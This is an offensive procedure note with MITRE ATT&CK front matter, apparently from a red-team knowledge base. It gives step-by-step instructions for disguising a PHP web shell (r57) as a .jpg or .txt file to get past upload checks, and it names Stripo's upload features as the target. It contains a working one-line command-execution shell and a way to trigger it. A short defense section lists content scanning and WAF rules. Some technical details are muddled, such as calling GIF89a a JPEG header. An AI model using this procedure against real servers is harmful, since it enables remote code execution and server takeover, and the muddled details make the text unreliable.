---
id: proc-001
tags:
  - web-shell
  - polyglot-file
  - php
type: procedure
tools:
  - '[[tools/r57-PHP-Web-Shell]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Server Software Component]]'
updated_at: '2025-12-14T05:32:10.255Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Server Software Component]]'
---
# Prepare-Polyglot-PHP-Web-Shell-for-Upload

## Summary

This procedure involves creating a malicious PHP web shell disguised as an allowed file type (e.g., .jpg or .txt) to bypass server-side extension checks during upload, enabling subsequent execution on PHP-enabled web servers.

## Description

In the context of Stripo's file upload features, servers block .php extensions but allow images and text files without content validation. By crafting a polyglot file—starting with a benign header (e.g., GIF89a for JPEG) followed by PHP code like a simple system command executor—the attacker can upload executable code. This targets PHP environments where files are served with interpretable MIME types, leading to remote code execution (RCE). Prerequisites include basic knowledge of PHP and file manipulation; expected outcome is a stored web shell for server compromise.

## Requirements

1. Access to a text editor (e.g., Notepad++ or VS Code)
2. Download of a PHP web shell payload (e.g., r57 from public repositories)
3. Target server running PHP without strict file content scanning

## Defense

Defensive measures and detection strategies:

- Implement client-side and server-side content validation (e.g., scan for PHP tags using libraries like ClamAV or custom regex)
- Use WAF rules to block polyglot uploads (e.g., detect <?php in non-script files)
- Log and monitor upload attempts, alerting on suspicious extensions or MIME mismatches

## Objectives

1. Create a bypassable malicious file for upload
2. Ensure compatibility with target MIME types for execution
3. Prepare for shell deployment leading to RCE

## Instructions

### Step 1: Download Web Shell Payload

**Context**: Obtain a standard PHP web shell to use as the core payload.

Download the r57 shell from a trusted testing repository (e.g., GitHub security testing repos). Save it as r57.php.

### Step 2: Create Polyglot File

**Context**: Modify the shell to disguise it as an image or text file while preserving PHP functionality.

Open r57.php in a text editor. Prepend a JPEG header like `\xff\xd8\xff` (hex for JPEG start) or simply save the content with .jpg extension. For text disguise, no header needed—just rename to .txt. Example payload snippet:

```
<?php system($_GET['cmd']); ?>
```

Save as shell.jpg.

### Step 3: Verify Polyglot Integrity

**Context**: Test that the file can be interpreted as both the disguise and PHP code.

Open shell.jpg in an image viewer (should fail or show corruption) and in a browser on a test PHP server (should execute if accessed with ?cmd=echo test).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Server Software Component]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/r57-PHP-Web-Shell]]

## Tags

- web-shell
- polyglot-file
- php
